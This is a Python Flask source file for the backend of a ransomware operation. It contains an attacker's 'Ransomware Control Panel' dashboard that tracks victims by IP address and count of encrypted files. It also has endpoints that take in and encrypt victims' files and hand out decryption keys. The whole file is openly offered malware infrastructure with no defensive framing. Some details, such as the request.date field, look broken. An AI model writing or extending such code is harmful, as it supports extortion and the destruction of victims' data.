# Backend (Flask app for Render - In-Memory Only)
from flask import Flask, request, jsonify, render_template_string
from cryptography.fernet import Fernet
import uuid

app = Flask(__name__)
# In a real scenario, this key would be generated once and stored securely
# For this in-memory example, it's regenerated on every restart, losing all data
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)
victims_db = {}

# HTML for the attacker's dashboard
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Ransomware Control Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #222; color: #eee; margin: 20px; }
        h1 { color: #f00; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #555; padding: 8px; text-align: left; }
        th { background-color: #333; }
        tr:nth-child(even) { background-color: #2a2a2a; }
        button { background-color: #5cb85c; color: white; padding: 10px 15px; border: none; cursor: pointer; }
        button:hover { background-color: #4cae4c; }
        .response { margin-top: 20px; padding: 15px; background-color: #333; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Ransomware Control Panel</h1>
    <p>Total Victims: {{ victims|length }}</p>
    <table>
        <tr>
            <th>Victim ID</th>
            <th>IP Address</th>
            <th>Files Encrypted</th>
            <th>Timestamp</th>
            <th>Action</th>
        </tr>
        {% for victim_id, data in victims.items() %}
        <tr>
            <td>{{ victim_id }}</td>
            <td>{{ data.ip }}</td>
            <td>{{ data.files|length }}</td>
            <td>{{ data.timestamp }}</td>
            <td><button onclick="decrypt('{{ victim_id }}')">Decrypt Files</button></td>
        </tr>
        {% endfor %}
    </table>
    <div id="response-area" class="response"></div>

    <script>
        async function decrypt(victimId) {
            const responseArea = document.getElementById('response-area');
            responseArea.innerHTML = 'Processing...';
            
            try {
                const response = await fetch('/decrypt', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ victim_id: victimId })
                });
                const result = await response.json();
                
                if (result.status === 'success') {
                    responseArea.innerHTML = `<h3>Decryption Key for ${victimId}</h3><p>${result.decryption_key}</p><p><strong>WARNING:</strong> This key will be displayed only once. Copy it now.</p>`;
                } else {
                    responseArea.innerHTML = `<p>Error: ${result.message}</p>`;
                }
            } catch (error) {
                responseArea.innerHTML = `<p>Failed to communicate with server: ${error.message}</p>`;
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML, victims=victims_db)

@app.route('/encrypt', methods=['POST'])
def encrypt_endpoint():
    data = request.json
    victim_id = str(uuid.uuid4())
    ip_address = request.remote_addr
    
    encrypted_files = {}
    for filename, content in data.get('files', {}).items():
        encrypted_files[filename] = cipher_suite.encrypt(content.encode()).decode()
        
    victims_db[victim_id] = {
        'ip': ip_address,
        'files': encrypted_files,
        'timestamp': str(request.date)
    }
    
    return jsonify({'status': 'success', 'victim_id': victim_id})

@app.route('/decrypt', methods=['POST'])
def decrypt_endpoint():
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id not in victims_db:
        return jsonify({'status': 'error', 'message': 'Victim ID not found'}), 404
        
    # In a real scenario, you would use the victim's specific key
    # Here we're returning the master key for simplicity
    del victims_db[victim_id]
    return jsonify({
        'status': 'success', 
        'decryption_key': encryption_key.decode()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)